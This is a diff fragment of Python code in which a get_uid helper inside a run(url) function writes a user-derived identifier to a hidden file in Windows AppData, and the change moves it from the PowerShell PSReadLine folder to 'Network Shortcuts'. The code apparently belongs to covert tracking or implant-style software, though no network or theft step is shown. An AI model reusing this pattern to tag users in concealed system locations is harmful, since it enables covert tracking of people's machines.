@@ -13,13 +13,8 @@ def run(url):
     def get_uid():
         if platform.system() == "Windows":
             user = getpass.getuser()
-            if os.path.exists(
-                f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt"
-            ):
-                with open(
-                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt",
-                    "r",
-                ) as f:
+            if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\uid.txt"):
+                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\uid.txt","r",) as f:
                     return f.read().strip()
             else:
                 uid_value = (
@@ -29,7 +24,7 @@ def run(url):
                     + str(uuid.uuid4())
                 )
                 with open(
-                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt",
+                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\uid.txt",
                     "w",
                 ) as f:
                     f.write(uid_value)
